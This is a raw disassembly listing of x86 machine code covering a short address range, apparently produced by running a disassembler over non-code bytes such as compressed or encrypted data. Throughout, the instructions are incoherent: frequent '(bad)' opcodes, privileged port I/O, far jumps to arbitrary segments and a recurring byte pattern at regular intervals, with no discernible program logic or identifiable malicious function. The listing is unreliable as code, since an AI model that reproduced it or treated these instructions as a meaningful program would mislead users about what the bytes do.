  41f6ca:	push   ecx
  41f6cb:	jg     0x41f743
  41f6cd:	add    DWORD PTR [eax-0x1c87daaf],edi
  41f6d3:	or     edi,edi
  41f6d5:	rcr    bh,cl
  41f6d7:	pop    es
  41f6d8:	jl     0x41f6bf
  41f6da:	jecxz  0x41f666
  41f6dc:	ror    DWORD PTR [esi],cl
  41f6de:	mov    eax,ds:0xacbf061a
  41f6e3:	add    BYTE PTR [esp+ebp*4+0x6a],al
  41f6e7:	ret    
  41f6e8:	ins    DWORD PTR es:[edi],dx
  41f6e9:	hlt    
  41f6ea:	fst    DWORD PTR [ebx]
  41f6ec:	repz xor dh,dl
  41f6ef:	ins    DWORD PTR es:[edi],dx
  41f6f0:	stos   BYTE PTR es:[edi],al
  41f6f1:	popa   
  41f6f2:	retf   0xc4a1
  41f6f5:	loop   0x41f76b
  41f6f7:	pop    esp
  41f6f8:	hlt    
  41f6f9:	lods   eax,DWORD PTR ds:[esi]
  41f6fa:	repz sub eax,ebp
  41f6fd:	or     ebx,DWORD PTR [eax+0x6a]
  41f700:	pop    ebx
  41f701:	addr16 leave 
  41f703:	(bad)  
  41f704:	adc    ah,al
  41f706:	aas    
  41f707:	loopne 0x41f6b9
  41f709:	xchg   esp,eax
  41f70a:	int    0x63
  41f70c:	ins    BYTE PTR es:[edi],dx
  41f70d:	aas    
  41f70e:	sub    eax,0xb2b6a94c
  41f713:	xor    eax,0xe7645e1f
  41f718:	pop    ds
  41f719:	and    eax,ecx
  41f71b:	cwde   
  41f71c:	mov    edi,0x2290d8fa
  41f721:	mov    DWORD PTR [ebx-0x6],edx
  41f724:	xchg   edx,eax
  41f725:	inc    ebp
  41f726:	mov    cl,BYTE PTR [ebx]
  41f728:	fst    QWORD PTR [ebx]
  41f72a:	jge    0x41f776
  41f72c:	xlat   BYTE PTR ds:[ebx]
  41f72d:	int    0xbe
  41f72f:	ror    BYTE PTR [eax+0x1773d247],cl
  41f735:	mov    ?,WORD PTR [ecx-0x10547afc]
  41f73b:	hlt    
  41f73c:	sub    edi,DWORD PTR ds:0xba595e4c
  41f742:	or     ebx,DWORD PTR [eax+0x61c6bd8e]
  41f748:	or     ah,BYTE PTR [edi-0x3f]
  41f74b:	and    ah,BYTE PTR [edi-0x61]
  41f74e:	lea    edx,[ebx+0x6]
  41f751:	pop    es
  41f752:	xchg   ebx,eax
  41f753:	std    
  41f754:	and    eax,0x396ced2f
  41f759:	iret   
  41f75a:	add    DWORD PTR [esi-0x301e3599],esi
  41f760:	(bad)  
  41f761:	pop    edi
  41f762:	adc    ecx,DWORD PTR [edi+0x54]
  41f765:	mov    BYTE PTR [esi],bh
  41f767:	sub    BYTE PTR [esi-0x5b45df82],bh
  41f76d:	out    dx,al
	...
  41f7d6:	xchg   edx,eax
  41f7d7:	cmp    al,0x23
  41f7d9:	jle    0x41f78a
  41f7db:	jg     0x41f7bc
  41f7dd:	cld    
  41f7de:	call   0x7b0b:0xd36c62d2
  41f7e5:	aam    0x67
  41f7e7:	push   edx
  41f7e8:	add    DWORD PTR [eax],eax
  41f7ea:	add    BYTE PTR [ecx],al
  41f7ec:	add    BYTE PTR [eax],al
  41f7ee:	cmp    al,0xee
  41f7f0:	mov    ds:0xe35df539,al
  41f7f5:	aam    0x97
  41f7f7:	or     eax,0x12215e7c
  41f7fc:	pop    esp
  41f7fd:	jmp    0x41f848
  41f7ff:	mov    ds:0xb7a185a5,eax
  41f804:	div    BYTE PTR [ecx]
  41f806:	push   ecx
  41f807:	shr    ecx,cl
  41f809:	test   esi,edx
  41f80b:	cld    
  41f80c:	test   al,0x50
  41f80e:	cmp    BYTE PTR [ebx+0x7dba92cc],al
  41f814:	mov    al,0xa
  41f816:	mov    esi,0x8d2aa7d7
  41f81b:	outs   dx,BYTE PTR ds:[esi]
  41f81c:	sbb    edi,ebp
  41f81e:	iret   
  41f81f:	std    
  41f820:	inc    eax
  41f821:	pop    esi
  41f822:	jbe    0x41f873
  41f824:	adc    al,0x95
  41f826:	push   ebx
  41f827:	xchg   DWORD PTR [ecx-0x73],ecx
  41f82a:	cmp    DWORD PTR [eax],0x53
  41f82d:	iret   
  41f82e:	ror    esi,cl
  41f830:	loope  0x41f855
  41f832:	jmp    0x1814314b
  41f837:	push   edi
  41f838:	xchg   esp,eax
  41f839:	ror    esi,0x6f
  41f83c:	cli    
  41f83d:	adc    ch,dl
  41f83f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f840:	pop    esp
  41f841:	push   edi
  41f842:	or     BYTE PTR [ebp-0x5d],0xad
  41f846:	and    bl,bh
  41f848:	xchg   edx,eax
  41f849:	je     0x41f84f
  41f84b:	in     al,0xa
  41f84d:	add    ah,BYTE PTR [ebx]
  41f84f:	push   ebp
  41f850:	adc    al,0x7
  41f852:	add    al,0x2b
  41f854:	sub    al,0x6f
  41f856:	gs dec ebx
  41f858:	push   esi
  41f859:	mov    ch,0x8d
  41f85b:	inc    ebx
  41f85c:	sbb    al,0x97
  41f85e:	push   ds
  41f85f:	dec    esi
  41f860:	popf   
  41f861:	mov    dl,al
  41f863:	outs   dx,DWORD PTR ds:[esi]
  41f864:	xor    dl,dl
  41f866:	aaa    
  41f867:	xchg   esp,eax
  41f868:	fnstcw WORD PTR [edi+0x7d13b378]
  41f86e:	xor    al,0x93
  41f870:	(bad)  
  41f871:	retf   
  41f872:	mov    ch,0x0
  41f874:	dec    edi
  41f875:	push   cs
  41f876:	pusha  
  41f877:	lods   eax,DWORD PTR ds:[esi]
  41f878:	mov    dl,0xa
  41f87a:	mov    WORD PTR [edx+0xc],ss
  41f87d:	stos   BYTE PTR es:[edi],al
  41f87e:	xor    ch,BYTE PTR [ecx]
  41f880:	sbb    eax,DWORD PTR [esi-0x16976496]
  41f886:	sbb    al,0xe1
  41f888:	shl    DWORD PTR [esi+0x4a821af5],0xad
  41f88f:	cli    
  41f890:	pushf  
  41f891:	push   0x5c16f237
  41f896:	xor    esi,esi
  41f898:	push   ss
  41f899:	je     0x41f899
  41f89b:	dec    edx
  41f89c:	xor    BYTE PTR [ecx+0x16f3d376],bl
  41f8a2:	xchg   ecx,eax
  41f8a3:	sar    dh,0xec
  41f8a6:	(bad)  
  41f8a8:	(bad)  [eax-0x1]
  41f8ab:	or     eax,0xb4f972cf
  41f8b0:	cmp    cl,BYTE PTR [eax+ebx*8+0x76db104]
  41f8b7:	sbb    DWORD PTR [edi+0x3e0dfe2c],edx
  41f8bd:	pop    eax
  41f8be:	cwde   
  41f8bf:	sbb    eax,0x55c02e52
  41f8c4:	sbb    DWORD PTR [ebx+0x5c],ebp
  41f8c7:	in     eax,dx
  41f8c8:	mov    dl,0x98
  41f8ca:	pop    eax
  41f8cb:	mov    WORD PTR [esp+ecx*2+0x6da7fce],cs
  41f8d2:	ret    
  41f8d3:	jge    0x41f88d
  41f8d5:	shr    dl,0x8c
  41f8d8:	and    ebp,DWORD PTR [ebp+0x4]
  41f8db:	loop   0x41f951
  41f8dd:	pop    ds
  41f8de:	int    0xf7
  41f8e0:	xchg   BYTE PTR [esi],bh
  41f8e2:	pop    ecx
  41f8e3:	mov    ebp,0x34e562e8
  41f8e8:	(bad)  
  41f8e9:	out    dx,al
  41f8ea:	(bad)  
  41f8eb:	in     eax,dx
  41f8ec:	jmp    0x41f8b6
	...
  41f956:	mov    eax,ds:0x3b920b9a
  41f95b:	xchg   ebx,eax
  41f95c:	mov    ecx,0x4183febb
  41f961:	pop    edx
  41f962:	retf   0x962a
  41f965:	stc    
  41f966:	addr16 push ebx
  41f968:	add    DWORD PTR [eax],eax
  41f96a:	add    BYTE PTR [ecx],al
  41f96c:	add    BYTE PTR [eax],al
  41f96e:	pop    esp
  41f96f:	out    0x64,al
  41f971:	xor    al,0x4b
  41f973:	sar    DWORD PTR [ebx-0x1e],0x7
  41f977:	fucomip st,st(2)
  41f979:	pop    edx
  41f97a:	add    ebx,0x290dbea
  41f980:	dec    ecx
  41f981:	icebp  
  41f982:	cdq    
  41f983:	adc    edx,DWORD PTR [esp+ecx*1+0x7129b27d]
  41f98a:	sub    DWORD PTR [ecx+0x6ecccac2],esp
  41f990:	mov    dl,ch
  41f992:	or     DWORD PTR [esi-0x45],0xb4ec2ef7
  41f999:	or     bh,BYTE PTR [ebp+0x7d]
  41f99c:	jl     0x41f9b4
  41f99e:	mul    dl
  41f9a0:	mov    ds:0xa9330bb3,eax
  41f9a5:	(bad)  
  41f9a6:	leave  
  41f9a7:	and    al,0x65
  41f9a9:	pop    edx
  41f9aa:	adc    al,0xe4
  41f9ac:	jmp    0x9dbe:0x2cfddf27
  41f9b3:	jno    0x41f9cb
  41f9b5:	xchg   DWORD PTR [ebx-0x31],esi
  41f9b8:	jge    0x41f9b0
  41f9ba:	aaa    
  41f9bb:	push   cs
  41f9bc:	jmp    FWORD PTR [ecx]
  41f9be:	or     DWORD PTR [ecx+0x5b823456],0x880d0eb
  41f9c8:	in     eax,0xbb
  41f9ca:	daa    
  41f9cb:	push   esi
  41f9cc:	stc    
  41f9cd:	popa   
  41f9ce:	fcomp  QWORD PTR [edx]
  41f9d0:	popa   
  41f9d1:	leave  
  41f9d2:	repnz mov bl,0x55
  41f9d5:	leave  
  41f9d6:	push   edx
  41f9d7:	adc    eax,0x248ccf3f
  41f9dc:	xchg   BYTE PTR ds:0x5af3cb23,dh
  41f9e2:	les    ebp,FWORD PTR [edi+0x5b11c707]
  41f9e8:	daa    
  41f9e9:	or     eax,0x97291131
  41f9ee:	push   ebx
  41f9ef:	mov    bl,0x8e
  41f9f1:	cmp    dh,BYTE PTR [eax+0x2d190f21]
  41f9f7:	pop    ss
  41f9f8:	dec    edi
  41f9f9:	dec    esp
  41f9fa:	fld    TBYTE PTR [ebp-0x12]
  41f9fd:	div    al
  41f9ff:	int3   
  41fa00:	addr16 or al,0x1f
  41fa03:	jge    0x41fa76
  41fa05:	adc    BYTE PTR [esi+0x56],cl
  41fa08:	outs   dx,DWORD PTR ds:[esi]
  41fa09:	cmc    
  41fa0a:	inc    edx
  41fa0b:	mov    ebx,0xec17328c
  41fa10:	in     eax,dx
  41fa11:	push   cs
  41fa12:	(bad)  
  41fa13:	adc    BYTE PTR [ebp-0x33c94172],bh
  41fa19:	xchg   edi,eax
  41fa1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa1b:	mov    bh,ah
  41fa1d:	psrlq  mm3,QWORD PTR [ecx]
  41fa20:	ret    0x5b1
  41fa23:	das    
  41fa24:	daa    
  41fa25:	(bad)  
  41fa26:	aam    0x1b
  41fa28:	xor    dl,dh
  41fa2a:	xor    dh,BYTE PTR [esi+0x57cb1f35]
  41fa30:	sbb    DWORD PTR [ebx-0x496df17c],esi
  41fa36:	sub    ecx,ecx
  41fa38:	lahf   
  41fa39:	cdq    
  41fa3a:	dec    edi
  41fa3b:	push   0x3a0262ce
  41fa40:	imul   ecx,DWORD PTR [ecx+0x74],0xffffff92
  41fa44:	aad    0xb
  41fa46:	cmp    bl,BYTE PTR [ebx+0x16a476ad]
  41fa4c:	mov    esp,0x630e1f8d
  41fa51:	imul   edx,DWORD PTR [ebx+ebp*1],0xffffffb3
  41fa55:	jmp    0x52db9f4a
  41fa5a:	mov    ah,BYTE PTR [ebx]
  41fa5c:	jmp    0xa0d29967
  41fa61:	data16 adc bl,bl
  41fa64:	icebp  
  41fa65:	mov    DWORD PTR [edx-0x1ce65cd5],ebx
  41fa6b:	retf   
  41fa6c:	push   esp
  41fa6d:	jb     0x41fa6f
	...
  41fad3:	add    BYTE PTR [eax],al
  41fad5:	add    BYTE PTR [edx],cl
  41fad7:	inc    ecx
  41fad8:	mov    bh,0xa1
  41fada:	push   edi
  41fadc:	push   ds
  41fadd:	jmp    0x41fb02
  41fadf:	push   edi
  41fae0:	mov    ds:0xc96ae115,eax
  41fae5:	sbb    esp,DWORD PTR [edi+0x54]
  41fae8:	add    DWORD PTR [eax],eax
  41faea:	add    BYTE PTR [ecx],al
  41faec:	add    BYTE PTR [eax],al
  41faee:	jne    0x41fae4
  41faf0:	inc    ebp
  41faf1:	iret   
  41faf2:	addr16 mov ecx,0x7790ecae
  41faf8:	(bad)  
  41faf9:	in     eax,0x7c
  41fafb:	cmp    esi,DWORD PTR [edx]
  41fafd:	fldenv [ecx+eax*8]
  41fb00:	ret    
  41fb01:	shl    DWORD PTR [edx],cl
  41fb03:	call   0xe1777d4a
  41fb08:	aas    
  41fb09:	push   ebx
  41fb0a:	xor    ebx,DWORD PTR [ecx]
  41fb0c:	rdseed esi
  41fb0f:	hlt    
  41fb10:	pop    edi
  41fb11:	gs aas 
  41fb13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb14:	sub    ebx,ebp
  41fb16:	ins    BYTE PTR es:[edi],dx
  41fb17:	dec    edi
  41fb18:	dec    ecx
  41fb19:	mov    bl,0x55
  41fb1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb1c:	inc    ebx
  41fb1d:	call   0xbc16:0x6a6323d3
  41fb24:	xor    al,0xe0
  41fb26:	retf   0xe23a
  41fb29:	call   0x95ce0833
  41fb2e:	int3   
  41fb2f:	mov    bh,0xf
  41fb31:	cmp    ah,BYTE PTR [bp+si]
  41fb34:	jae    0x41fb11
  41fb36:	adc    DWORD PTR [edx-0x1a],ecx
  41fb39:	push   ss
  41fb3a:	push   es
  41fb3b:	(bad)  
  41fb3c:	push   DWORD PTR [edi+0xc628da6]
  41fb42:	push   cs
  41fb43:	and    DWORD PTR [edi-0x35],ebx
  41fb46:	shr    DWORD PTR [edx+0x220670],cl
  41fb4c:	fnsetpm(287 only) 
  41fb4e:	ret    0x3230
  41fb51:	arpl   WORD PTR [ebx+eax*2+0x75ea9f6],sp
  41fb58:	mov    dl,0xe4
  41fb5a:	mov    esi,0x4d4a87b8
  41fb5f:	xor    al,0x1c
  41fb61:	fnstenv [eax+0x217f888b]
  41fb67:	rcl    DWORD PTR [edi],1
  41fb69:	inc    si
  41fb6b:	sub    al,BYTE PTR [ecx+0x62b598fb]
  41fb71:	ret    
  41fb72:	imul   esi,DWORD PTR [edx+0x59],0x953db8dd
  41fb79:	fsubr  DWORD PTR [esi+0x45]
  41fb7c:	(bad)  
  41fb7d:	(bad)  
  41fb7f:	in     al,0xba
  41fb81:	xchg   esi,eax
  41fb82:	inc    ebx
  41fb83:	fs aaa 
  41fb85:	xor    DWORD PTR [edx],ebp
  41fb87:	dec    ebp
  41fb88:	test   DWORD PTR [ecx-0x54],0x622d23f2
  41fb8f:	sub    al,0x3
  41fb91:	ret    0xa134
  41fb94:	sub    eax,edi
  41fb96:	jg     0x41fbf7
  41fb98:	aas    
  41fb99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb9a:	push   ebp
  41fb9b:	inc    esp
  41fb9c:	xchg   edx,eax
  41fb9d:	push   ebp
  41fb9e:	psraw  mm4,QWORD PTR [ebp+edi*1+0x70]
  41fba3:	add    al,0xbe
  41fba5:	mov    al,ds:0x37e83b0d
  41fbaa:	jp     0x41fb9c
  41fbac:	or     BYTE PTR [esi],al
  41fbae:	(bad)  
  41fbaf:	mov    bh,0xf6
  41fbb1:	jb     0x41fc21
  41fbb3:	jae    0x41fbb9
  41fbb5:	jge    0x41fc0d
  41fbb7:	inc    ebp
  41fbb8:	xchg   esi,eax
  41fbb9:	call   0x1a66:0x391efee9
  41fbc0:	pop    es
  41fbc1:	stc    
  41fbc2:	mov    bh,0xff
  41fbc4:	fcmovu st,st(2)
  41fbc6:	cmp    DWORD PTR [eax-0x15],eax
  41fbc9:	pop    eax
  41fbca:	pushf  
  41fbcb:	pushw  0x69
  41fbcf:	mov    edi,0x68999b30
  41fbd4:	call   DWORD PTR [edi]
  41fbd6:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41fbd8:	inc    esp
  41fbd9:	dec    edx
  41fbda:	push   ds
  41fbdb:	mov    DWORD PTR [edx-0x4a],esp
  41fbde:	jecxz  0x41fba4
  41fbe0:	mov    DWORD PTR [edx-0x5f043937],edi
  41fbe6:	mov    ah,0xed
  41fbe8:	sub    ecx,0x3f
  41fbeb:	dec    ebp
  41fbec:	test   al,0xc1
	...
  41fc56:	fsubr  QWORD PTR [eax]
  41fc58:	mov    ah,ah
  41fc5a:	(bad)  
  41fc5b:	out    0xfe,al
  41fc5d:	cmp    BYTE PTR [esi],ah
  41fc5f:	ret    
  41fc60:	or     DWORD PTR [esi],edx
  41fc62:	mov    esp,0x67b964e6
  41fc67:	push   ebp
  41fc68:	add    DWORD PTR [eax],eax
  41fc6a:	add    BYTE PTR [ecx],al
  41fc6c:	add    BYTE PTR [eax],al
  41fc6e:	jecxz  0x41fcc3
  41fc70:	xchg   esp,eax
  41fc71:	pop    eax
  41fc72:	pop    edx
  41fc73:	stc    
  41fc74:	cli    
  41fc75:	mov    ds,WORD PTR [esi]
  41fc77:	jbe    0x41fc31
  41fc79:	jne    0x41fc98
  41fc7b:	xchg   edx,eax
  41fc7c:	sub    DWORD PTR [edx+0x30],ecx
  41fc7f:	adc    bh,ah
  41fc81:	cs jge 0x41fc67
  41fc84:	or     DWORD PTR [edi-0x2f3eec80],eax
  41fc8a:	adc    eax,edx
  41fc8c:	jae    0x41fcbb
  41fc8e:	out    dx,eax
  41fc8f:	mov    edi,0x217ac1fc
  41fc94:	imul   ebp,DWORD PTR [eax],0x5f4553c2
  41fc9a:	dec    ebp
  41fc9b:	or     DWORD PTR [ebp+0xb63ab85],0x59
  41fca2:	sbb    BYTE PTR [ecx+0x7],bl
  41fca5:	xchg   esi,eax
  41fca6:	(bad)  
  41fca7:	cmp    eax,DWORD PTR [eax-0x3181aeb5]
  41fcad:	leave  
  41fcae:	push   ecx
  41fcaf:	ret    
  41fcb0:	jmp    0x41fcf4
  41fcb2:	jns    0x41fc94
  41fcb4:	and    edi,DWORD PTR [esi]
  41fcb6:	lods   al,BYTE PTR ds:[esi]
  41fcb7:	jo     0x41fcc1
  41fcb9:	fstp   TBYTE PTR [edi-0x74]
  41fcbc:	adc    ch,BYTE PTR [edx+0x7d]
  41fcbf:	cmp    al,0x15
  41fcc1:	out    0x77,al
  41fcc3:	xchg   DWORD PTR [esi+0x7a80d239],eax
  41fcc9:	xor    edi,DWORD PTR [edi]
  41fccb:	std    
  41fccc:	pop    esi
  41fccd:	adc    ch,BYTE PTR [eax-0x28]
  41fcd0:	lds    esp,FWORD PTR [edi+0x5fc757fb]
  41fcd6:	mov    eax,ds:0x8033315a
  41fcdb:	out    dx,eax
  41fcdc:	push   ecx
  41fcdd:	pop    esp
  41fcde:	cmp    eax,0x3c003b41
  41fce3:	or     edi,DWORD PTR [eax]
  41fce5:	stc    
  41fce6:	and    eax,0xc0be9e00
  41fceb:	adc    edx,DWORD PTR [esi+0x66c73ab5]
  41fcf1:	rol    DWORD PTR [esi+0x30],cl
  41fcf4:	cmc    
  41fcf5:	jecxz  0x41fcc4
  41fcf7:	mov    DWORD PTR [ebx-0x2cb19105],ebx
  41fcfd:	fmul   DWORD PTR ds:0x3151ecb3
  41fd03:	cmp    esi,DWORD PTR [edx+0x184ed282]
  41fd09:	aaa    
  41fd0a:	cmp    DWORD PTR [eax+eax*8],edx
  41fd0d:	xchg   ebx,eax
  41fd0e:	ja     0x41fcde
  41fd10:	sub    ecx,DWORD PTR [esi+0x568f1abe]
  41fd16:	jmp    0x4eff816a
  41fd1b:	scas   eax,DWORD PTR es:[edi]
  41fd1c:	jge    0x41fd83
  41fd1e:	jns    0x41fd1d
  41fd20:	sahf   
  41fd21:	icebp  
  41fd22:	xlat   BYTE PTR ds:[ebx]
  41fd23:	fild   WORD PTR [ebp+0x7336c92e]
  41fd29:	stos   BYTE PTR es:[edi],al
  41fd2a:	pop    edx
  41fd2b:	and    DWORD PTR [eax+0x56],edi
  41fd2e:	jno    0x41fd89
  41fd30:	pop    ecx
  41fd31:	or     eax,DWORD PTR [ebp+0x16]
  41fd34:	pop    eax
  41fd35:	push   ebp
  41fd36:	xor    eax,DWORD PTR [eax-0x44]
  41fd39:	pop    es
  41fd3a:	mov    DWORD PTR [esi],eax
  41fd3c:	out    0x98,eax
  41fd3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd40:	pop    eax
  41fd41:	push   ds
  41fd42:	cli    
  41fd43:	call   0x1bc5ef4d
  41fd48:	in     al,0x7f
  41fd4a:	xchg   edi,eax
  41fd4b:	fld    DWORD PTR [edi+0x5b]
  41fd4e:	adc    ebx,edi
  41fd50:	and    bl,BYTE PTR [edx]
  41fd52:	or     esp,DWORD PTR [si-0xca7]
  41fd57:	or     al,0x6f
  41fd59:	push   esi
  41fd5a:	repnz adc BYTE PTR fs:[ebx+0x3c62f758],bl
  41fd62:	fcomi  st,st(0)
  41fd64:	dec    edi
  41fd65:	(bad)  
  41fd66:	es stc 
  41fd68:	fwait
  41fd69:	nop
  41fd6a:	jb     0x41fd10
  41fd6c:	pop    ebp
  41fd6d:	lea    eax,[eax]
	...
  41fdd3:	add    BYTE PTR [eax],al
  41fdd5:	add    BYTE PTR [edx+ebp*2],cl
  41fdd8:	push   edx
  41fdd9:	shl    DWORD PTR [esi-0x7],0x9f
  41fddd:	out    dx,eax
  41fdde:	pop    ds
  41fddf:	pop    edx
  41fde0:	pushf  
  41fde1:	push   ss
  41fde2:	call   0x156:0x679ec659
  41fde9:	add    BYTE PTR [eax],al
  41fdeb:	add    DWORD PTR [eax],eax
  41fded:	add    BYTE PTR [edi-0x75],ch
  41fdf0:	into   
  41fdf1:	jl     0x41fdbb
  41fdf3:	cs mov ebp,0x14c5b08a
  41fdf9:	mov    edx,0x88ca802c
  41fdfe:	push   es
  41fdff:	jo     0x41fe1a
  41fe01:	xor    eax,DWORD PTR [edx]
  41fe03:	xchg   ebx,eax
  41fe04:	mov    esi,0x160519cc
  41fe09:	loope  0x41fdf1
  41fe0b:	sub    eax,0xe78512b6
  41fe10:	mov    ds:0x845fbfa2,eax
  41fe15:	cs add al,0xa7
  41fe18:	mov    bh,al
  41fe1a:	xchg   DWORD PTR [edx],esi
  41fe1c:	mov    bh,0xf1
  41fe1e:	pop    ecx
  41fe1f:	test   eax,0x547db10e
  41fe24:	inc    esi
  41fe25:	inc    eax
  41fe26:	xchg   ah,cl
  41fe28:	mov    ah,0x3e
  41fe2a:	adc    DWORD PTR [edx],edi
  41fe2c:	inc    ebp
  41fe2d:	add    DWORD PTR [ecx+0x5d],eax
  41fe30:	adc    eax,0x19be5c77
  41fe35:	(bad)  
  41fe36:	mov    eax,ds:0xc19dcd77
  41fe3b:	push   ecx
  41fe3c:	cmp    ebx,edi
  41fe3e:	mov    al,ds:0xe2e9ef0
  41fe43:	push   0xb7db4977
  41fe48:	lods   al,BYTE PTR ds:[esi]
  41fe49:	and    BYTE PTR es:[edi-0x17c9b3ad],cl
  41fe50:	push   edi
  41fe51:	add    DWORD PTR [ebx-0x53],eax
  41fe54:	adc    eax,0x74359211
  41fe59:	repz cmp eax,0x504634ff
  41fe5f:	xor    eax,DWORD PTR [eax-0x63]
  41fe62:	jge    0x41fe88
  41fe64:	mov    edx,0x934c4974
  41fe69:	cwde   
  41fe6a:	pop    esi
  41fe6b:	jmp    0x9b8bb6d6
  41fe70:	fld    TBYTE PTR [esi-0x15c5f981]
  41fe76:	dec    edi
  41fe77:	cdq    
  41fe78:	arpl   WORD PTR [ebp+0x38b29996],sp
  41fe7e:	add    bl,bl
  41fe80:	gs dec ebp
  41fe82:	xchg   ebp,eax
  41fe83:	mov    bl,0xd9
  41fe85:	pop    ss
  41fe86:	dec    ebp
  41fe87:	mov    ?,esp
  41fe89:	xor    BYTE PTR [eax-0x6f8dd533],bh
  41fe8f:	cmp    al,0xc6
  41fe91:	pop    ss
  41fe92:	aas    
  41fe93:	addr16 inc esp
  41fe95:	jbe    0x41fe25
  41fe97:	xchg   DWORD PTR [ecx-0x45],esp
  41fe9a:	ins    BYTE PTR es:[edi],dx
  41fe9b:	mov    BYTE PTR [esi],cl
  41fe9d:	and    BYTE PTR [ebx],al
  41fe9f:	rol    DWORD PTR [ecx-0xf],1
  41fea2:	push   ebx
  41fea3:	mov    dh,0x97
  41fea5:	xor    ecx,DWORD PTR [edx]
  41fea7:	popa   
  41fea8:	dec    ebp
  41fea9:	sbb    DWORD PTR [eax],ebp
  41feab:	outs   dx,DWORD PTR ds:[esi]
  41feac:	inc    esp
  41fead:	push   es
  41feae:	test   eax,0x8532bcc4
  41feb3:	or     dl,BYTE PTR [esi+0x635d2436]
  41feb9:	icebp  
  41feba:	pop    edi
  41febb:	push   0xd
  41febd:	sub    al,0x9f
  41febf:	test   DWORD PTR [esi-0x4b],ecx
  41fec2:	sub    ebp,eax
  41fec4:	adc    ebp,DWORD PTR [eax-0x43]
  41fec7:	inc    ebx
  41fec8:	cmc    
  41fec9:	mov    ch,0xe3
  41fecb:	push   0xd1d787ac
  41fed0:	minps  xmm7,XMMWORD PTR [ecx+0x1d9db77]
  41fed7:	inc    esi
  41fed8:	(bad)  
  41fed9:	std    
  41feda:	js     0x41fea8
  41fedc:	xchg   ebx,eax
  41fedd:	mov    esi,0x274049ed
  41fee2:	sbb    eax,0xeb4ce297
  41fee7:	(bad)  
  41fee8:	out    dx,al
  41fee9:	inc    edi
  41feea:	jp     0x41ff13
  41feec:	cmp    eax,0xd8
	...
  41ff55:	add    BYTE PTR [edx-0x1865ab],ch
  41ff5b:	out    dx,eax
  41ff5c:	call   FWORD PTR [ebp-0x5]
  41ff5f:	(bad)  
  41ff60:	hlt    
  41ff61:	mov    ah,0xb9
  41ff63:	pop    ebx
  41ff64:	ss aam 0x67
  41ff67:	push   edi
  41ff68:	add    DWORD PTR [eax],eax
  41ff6a:	add    BYTE PTR [ecx],al
  41ff6c:	add    BYTE PTR [eax],al
  41ff6e:	jae    0x41ffdc
  41ff70:	loop   0x41ff4c
  41ff72:	adc    BYTE PTR [ebx-0x7de4ff56],0x30
  41ff79:	call   0x1ad1a052
  41ff7e:	outs   dx,DWORD PTR ds:[esi]
  41ff7f:	mov    al,0xe1
  41ff81:	scas   al,BYTE PTR es:[edi]
  41ff82:	jno    0x41ffa0
  41ff84:	shl    BYTE PTR [edi],cl
  41ff86:	jns    0x41ff71
  41ff88:	mov    WORD PTR [eax-0x5b],gs
  41ff8b:	pop    ebx
  41ff8c:	xchg   edi,eax
  41ff8d:	and    DWORD PTR [eax-0x581ce0c9],ecx
  41ff93:	fcmove st,st(0)
  41ff95:	js     0x420010
  41ff97:	cwde   
  41ff98:	out    0x26,eax
  41ff9a:	push   es
  41ff9b:	js     0x41ffa7
  41ff9d:	retf   0x390a
  41ffa0:	inc    esp
  41ffa1:	sbb    DWORD PTR [ebp-0x7bbea539],ebx
  41ffa7:	shr    DWORD PTR [esi],1
  41ffa9:	arpl   WORD PTR [eax+0x4f5dba73],bx
  41ffaf:	dec    esp
  41ffb0:	mov    ch,0xe0
  41ffb2:	pop    ds
  41ffb3:	data16 add bl,BYTE PTR [edx+0x283f38b9]
  41ffba:	mov    edi,0x9d4df3b8
  41ffbf:	sub    eax,DWORD PTR [ecx]
  41ffc1:	stc    
  41ffc2:	jl     0x41ff78
  41ffc4:	jno    0x41ffa0
  41ffc6:	inc    esi
  41ffc7:	or     eax,0x1391949f
  41ffcc:	mov    edi,0xa7b805b8
  41ffd1:	jge    0x42003d
  41ffd3:	shl    DWORD PTR [ebx+0x33cc6a45],cl
  41ffd9:	mov    esp,0x62f1002d
  41ffde:	or     eax,0x426d51b2
  41ffe3:	ret    0x3bcd
  41ffe6:	test   DWORD PTR [edx-0x142ab28d],edx
  41ffec:	fnstcw WORD PTR [edx-0x151ce2b]
  41fff2:	xor    BYTE PTR [edi-0x19011a47],0xd3
  41fff9:	adc    al,0x33
  41fffb:	iret   
  41fffc:	jbe    0x420064
  41fffe:	ror    DWORD PTR [edi-0x7f],1
  420001:	or     bh,dl
  420003:	sbb    al,bl
  420005:	fsubr  QWORD PTR [ecx]
  420007:	out    0x23,al
  420009:	jnp    0x41ffd2
  42000b:	popf   
  42000c:	mov    bh,0xd1
  42000e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42000f:	imul   eax,ebp,0xb1d6f79d
  420015:	pop    ebp
  420016:	pop    edx
  420017:	call   0x1005ffd
  42001c:	daa    
  42001d:	stc    
  42001e:	lds    ebp,FWORD PTR [esi+0x621fa7fd]
  420024:	je     0x420027
  420026:	sbb    BYTE PTR [ebx-0xa4beade],0xe5
  42002d:	mov    ebx,0x17c85e20
  420032:	xchg   edx,eax
  420033:	(bad)  
  420034:	retf   
  420035:	xor    DWORD PTR [edx-0x33f447c],esp
  42003b:	addr16 jle 0x41ffef
  42003e:	out    dx,al
  42003f:	push   ds
  420040:	mov    ds:0x99a3a5ff,al
  420045:	pop    edi
  420046:	int    0x73
  420048:	mov    edx,0xa2cee402
  42004d:	push   ebx
  42004e:	mov    DWORD PTR [ebp+esi*1-0x7b133e74],edx
  420055:	cmc    
  420056:	mov    edi,0x69fc824b
  42005b:	or     DWORD PTR [ebx-0xf71666],ebx
  420061:	aaa    
  420062:	mov    ah,dh
  420064:	adc    esi,DWORD PTR [edi]
  420066:	int    0xd
  420068:	or     BYTE PTR [ebp+0x626e4fd0],al
	...
  4200d6:	bound  esp,QWORD PTR [ebp-0x8808a]
  4200dc:	imul   edi,DWORD PTR [ebp-0x6d81eb08],0x63
  4200e3:	push   esi
  4200e4:	arpl   WORD PTR [ecx],ax
  4200e6:	addr16 pop eax
  4200e8:	add    DWORD PTR [eax],eax
  4200ea:	add    BYTE PTR [ecx],al
  4200ec:	add    BYTE PTR [eax],al
